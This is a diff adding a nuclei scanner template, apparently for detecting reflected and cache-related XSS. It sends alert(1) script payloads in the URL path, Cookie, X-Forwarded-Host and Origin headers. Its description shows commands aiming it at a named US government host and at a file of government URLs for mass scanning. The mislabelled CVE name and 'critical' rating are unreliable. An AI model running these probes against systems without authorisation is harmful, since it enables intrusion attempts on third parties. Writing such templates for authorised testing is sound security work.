@@ -1,0 +1,89 @@
+id: XSS_test
+info:
+  author: 51pwn
+  description: 'XSS_test
+
+    nuclei -duc -t $PWD/config/51pwn/XSS_test.yaml -u https://calendar.fan.gov -debug
+
+    cat atckData/us_gov_httpx.json|jq ''.url''|sed ''s/"//g''|nuclei -duc -t $PWD/config/51pwn/XSS_test.yaml
+    -v
+
+    '
+  name: CVE-XSS_test-23752
+  reference:
+  - https://portswigger.net/research/web-cache-entanglement
+  - https://51pwn.com
+  severity: critical
+  tags: web,cve,2023
+requests:
+- cookie-reuse: true
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: or
+    part: body
+    type: word
+    words:
+    - <script>alert(1)</script>
+    - '''-alert(1)-'''
+  matchers-condition: and
+  raw:
+  - 'GET //?"><script>alert(1)</script> HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept:*/*
+
+    Cookie: language=''-alert(1)-'';
+
+    X-Forwarded-Host:''-alert(1)-''
+
+    origin: ''-alert(1)-''
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/97.0.4692.71 Safari/537.36
+
+
+
+    '
+  - 'GET /%2F?"><script>alert(1)</script> HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept:*/*
+
+    Cookie: language=''-alert(1)-'';
+
+    X-Forwarded-Host:''-alert(1)-''
+
+    origin: ''-alert(1)-''
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/97.0.4692.71 Safari/537.36
+
+
+
+
+    '
+  - 'GET /(A("><script>alert(1)</script>))/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept:*/*
+
+    Cookie: language=''-alert(1)-'';
+
+    X-Forwarded-Host:''-alert(1)-''
+
+    origin: ''-alert(1)-''
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/97.0.4692.71 Safari/537.36
+
+
+
+    '
+  req-condition: true
+  stop-at-first-match: true
+  unsafe: true
